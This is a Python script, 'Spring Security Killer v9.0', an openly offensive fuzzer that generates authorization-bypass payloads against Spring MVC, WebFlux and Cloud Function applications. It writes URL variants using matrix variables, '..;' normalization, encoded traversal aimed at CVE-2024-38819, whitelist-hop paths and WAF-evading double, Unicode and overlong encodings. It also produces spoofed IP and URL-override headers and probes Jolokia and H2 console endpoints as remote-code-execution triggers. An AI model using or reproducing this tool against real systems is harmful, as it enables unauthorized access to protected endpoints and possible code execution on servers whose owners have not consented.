#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
--------------------------------------------------------------------------------------
 Tool Name   : Spring Security Killer v9.0 (God Mode / Apocalypse Edition)
 Author      : 七萬-QiWan
 Date        : 2025-11-23
 Description : The absolute pinnacle of Spring fuzzing. Covers MVC, WebFlux,
               Spring Cloud Function, and OAuth2 protocol confusion.
 New Vectors :
   [+] WebFlux Strict Traversal (CVE-2024-38819)
   [+] Spring Cloud Function Endpoints (SpEL RCE vectors)
   [+] OAuth2/SAML Callback Mocking
   [+] Deep Unicode & Charset Anomalies
--------------------------------------------------------------------------------------
"""

import os
import sys
import datetime


# ===========================
# UI & Config
# ===========================
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class Logger:
    @staticmethod
    def info(msg): print(f"{Colors.BLUE}[INFO]{Colors.ENDC} {msg}")

    @staticmethod
    def success(msg): print(f"{Colors.GREEN}[SUCCESS]{Colors.ENDC} {msg}")

    @staticmethod
    def audit(key, desc):
        print(f"   {Colors.GREEN}✔{Colors.ENDC} {Colors.BOLD}{key.ljust(30)}{Colors.ENDC} : {desc}")


# ===========================
# Whitelist Manager
# ===========================
class WhitelistManager:
    def __init__(self):
        self.built_in = [
            '/static', '/public', '/resources', '/assets',
            '/actuator/health', '/v3/api-docs', '/swagger-ui.html',
            '/login/oauth2/code/github', '/login/saml2/sso',  # OAuth/SAML common paths
            '/functionRouter',  # Spring Cloud Function
            '/.well-known/jwks.json'
        ]
        self.custom = []

    def load_custom(self):
        if os.path.exists("whitelist.txt"):
            try:
                with open("whitelist.txt", 'r') as f:
                    self.custom = [l.strip() for l in f if l.strip()]
                Logger.success(f"Loaded {len(self.custom)} custom whitelist rules.")
            except:
                pass

    def get_all(self):
        return list(set(self.built_in + self.custom))


# ===========================
# The God Engine
# ===========================
class GodModeEngine:
    def __init__(self, whitelist_mgr):
        self.payloads = []
        self.seen = set()
        self.whitelists = whitelist_mgr.get_all()

    def add(self, payload, weight, tag="General"):
        if payload not in self.seen:
            self.seen.add(payload)
            self.payloads.append({'p': payload, 'w': weight, 't': tag})

    def generate(self, base_path):
        path = "/" + base_path.strip().lstrip("/")
        if "?" in path: path = path.split("?")[0]

        # 1. MVC Core (v8 Legacy)
        self._layer_mvc_matrix(path)
        self._layer_mvc_normalization(path)

        # 2. WebFlux / Reactive (NEW in v9)
        self._layer_webflux_strict(path)

        # 3. Cloud Function & RCE Triggers (NEW in v9)
        self._layer_cloud_function(path)

        # 4. OAuth2 & Protocol Confusion (NEW in v9)
        self._layer_auth_protocol_confusion(path)

        # 5. Whitelist Hop (v8 Legacy)
        self._layer_whitelist_hop(path)

        # 6. Advanced Encoding
        self._layer_encoding(path)

    # --- Layer 1: MVC Core ---
    def _layer_mvc_matrix(self, path):
        parts = path.strip('/').split('/')
        current = ""
        for i, part in enumerate(parts):
            current += "/" + part
            remaining = "/" + "/".join(parts[i + 1:]) if i < len(parts) - 1 else ""
            self.add(current + ";" + remaining, 10, "MVC-Matrix")
            self.add(current + ";jsessionid=x" + remaining, 10, "MVC-Matrix")
        self.add(path + ";", 10, "MVC-Matrix")

    def _layer_mvc_normalization(self, path):
        self.add(path.replace('/', '//'), 9, "MVC-Norm")
        self.add(f"/;{path}", 9, "MVC-Norm")
        self.add(f"/foo/..;{path}", 9, "MVC-Norm")

    # --- Layer 2: WebFlux / Reactive (Critical for modern apps) ---
    def _layer_webflux_strict(self, path):
        """
        WebFlux 不会自动解码 %2e%2e，且 PathPatternParser 比 AntPathMatcher 更严。
        针对 CVE-2024-38819
        """
        # 1. 严格编码的遍历
        self.add(f"/%2e%2e{path}", 10, "WebFlux-Trav")  # /%2e%2e/admin
        self.add(f"/%2e%2e/{path}", 10, "WebFlux-Trav")

        # 2. 混合编码 (WebFlux 对混合编码处理脆弱)
        self.add(path.replace('/', '/%2e%2e/'), 9, "WebFlux-Mix")

    # --- Layer 3: Cloud Function & RCE Triggers ---
    def _layer_cloud_function(self, path):
        """
        Spring Cloud Function 往往通过特定的路由访问
        """
        # 尝试通过 functionRouter 访问目标
        self.add(f"/functionRouter?input={path}", 8, "Cloud-Func")

        # Actuator RCE 变体 (Jolokia / H2)
        if "actuator" in path:
            self.add(path + "/jolokia", 10, "RCE-Trigger")
            self.add(path + "/h2-console", 10, "RCE-Trigger")

    # --- Layer 4: OAuth2 & Protocol Confusion ---
    def _layer_auth_protocol_confusion(self, path):
        """
        欺骗 Filter 认为这是 OAuth2 回调或静态资源
        """
        # 模拟 OAuth2 回调参数
        self.add(path + "?code=123&state=abc", 8, "OAuth-Fake")
        self.add(path + "?error=access_denied", 8, "OAuth-Fake")

        # 模拟静态资源 (Content Negotiation)
        exts = ['.json', '.xml', '.html', '.ico']
        for ext in exts:
            self.add(path + ext, 7, "Suffix-Conf")
            self.add(path + f";{ext}", 8, "Suffix-Matrix")

    # --- Layer 5: Whitelist Hop ---
    def _layer_whitelist_hop(self, path):
        for wl in self.whitelists:
            wl = "/" + wl.strip("/")
            # Standard
            self.add(f"{wl}/..;{path}", 9, f"Hop[{wl}]")
            # WebFlux Specific Hop
            self.add(f"{wl}/%2e%2e{path}", 9, f"Hop-Flux[{wl}]")

    # --- Layer 6: Encoding ---
    def _layer_encoding(self, path):
        self.add(path.replace('/', '%252f'), 6, "Encode-Double")
        self.add(path.replace('/', '%ef%bc%8f'), 6, "Unicode-Full")
        # Overlong UTF-8 (Rare but works on some gateways)
        self.add(path.replace('/', '%c0%af'), 5, "Overlong")

    def get_results(self):
        return sorted(self.payloads, key=lambda x: x['w'], reverse=True)


# ===========================
# Header Engine
# ===========================
class HeaderGodEngine:
    def generate(self, targets):
        headers = []
        # 1. IP / Host Spoofing
        for ip in ["127.0.0.1", "localhost", "::1"]:
            headers.append(f"X-Forwarded-For: {ip}")
            headers.append(f"X-Real-IP: {ip}")
            headers.append(f"X-Remote-Addr: {ip}")

        # 2. Context Overriding
        for t in targets:
            cl = "/" + t.strip().lstrip("/")
            headers.append(f"X-Original-URL: {cl}")
            headers.append(f"X-Rewrite-URL: {cl}")
            headers.append(f"X-Forwarded-Prefix: {cl}")

        # 3. Spring Cloud Gateway Filters
        headers.append("X-Forwarded-Proto: https")
        headers.append("X-Forwarded-Port: 443")
        return list(set(headers))


# ===========================
# Coverage Report
# ===========================
def print_god_mode_manifest():
    print("\n" + "=" * 70)
    print(f"{Colors.BOLD}{Colors.HEADER}   ⚡ SPRING SECURITY KILLER v9.0 [GOD MODE] COVERAGE MAP   {Colors.ENDC}")
    print("=" * 70)

    print(f"\n{Colors.CYAN}[Tier 1] Architecture Specifics (架构特性){Colors.ENDC}")
    Logger.audit("Spring MVC (Servlet)", "Matrix Variables (;), Path Normalization (..;/)")
    Logger.audit("Spring WebFlux (Netty)", "Strict Encoding (/%2e%2e/), PathPatternParser Quirks")
    Logger.audit("Spring Cloud Function", "Function Routing Bypass, SpEL Entry Points")

    print(f"\n{Colors.CYAN}[Tier 2] Protocol & Logic (协议与逻辑){Colors.ENDC}")
    Logger.audit("OAuth2/SAML Spoofing", "Fake Callback Params (?code=, ?state=)")
    Logger.audit("Content Negotiation", "Extension Confusion (.json, .xml, ;.css)")
    Logger.audit("Hop-by-Hop Injection", "Whitelist Traversal (Built-in + Custom)")

    print(f"\n{Colors.CYAN}[Tier 3] Evasion & Obfuscation (对抗与混淆){Colors.ENDC}")
    Logger.audit("WAF Evasion", "Double Encoding (%252f), Unicode (%ef%bc%8f), Overlong UTF-8")
    Logger.audit("Context Hijacking", "Header Spoofing (X-Original-URL, X-Forwarded-Prefix)")

    print("-" * 70)
    print(f"{Colors.WARNING}* Note: This tool now covers CVE-2024-38819 (WebFlux Traversal){Colors.ENDC}")
    print("=" * 70 + "\n")


# ===========================
# Main
# ===========================
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Colors.BOLD}{Colors.HEADER}Spring Security Killer v9.0 [God Mode]{Colors.ENDC}")
    print(f"{Colors.CYAN}Author: 七萬-QiWan | Focus: MVC + WebFlux + Cloud{Colors.ENDC}\n")

    # 1. Target Detection
    cwd = os.getcwd()
    files = [f for f in os.listdir(cwd) if f.endswith('.txt') and not f.startswith('fuzz_') and f != 'whitelist.txt']
    if not files:
        Logger.audit("Error", "No target .txt file found.")
        sys.exit(1)
    target_file = files[0]

    try:
        with open(target_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    except:
        sys.exit(1)

    # 2. Load Whitelists
    wl_mgr = WhitelistManager()
    wl_mgr.load_custom()

    # 3. Generate God Mode Payloads
    url_engine = GodModeEngine(wl_mgr)
    for t in targets: url_engine.generate(t)
    url_results = url_engine.get_results()

    header_engine = HeaderGodEngine()
    header_results = header_engine.generate(targets)

    # 4. Output
    ts = datetime.datetime.now().strftime('%Y%m%d_%H%M')
    f_urls = f"fuzz_urls_{ts}.txt"
    f_headers = f"fuzz_headers_{ts}.txt"

    with open(f_urls, 'w') as f:
        for i in url_results: f.write(f"{i['p']}\n")
    with open(f_headers, 'w') as f:
        for h in header_results: f.write(f"{h}\n")

    print_god_mode_manifest()
    Logger.success(f"Generated {len(url_results)} God-Tier URLs -> {f_urls}")
    Logger.success(f"Generated {len(header_results)} Headers -> {f_headers}")


if __name__ == "__main__":
    main()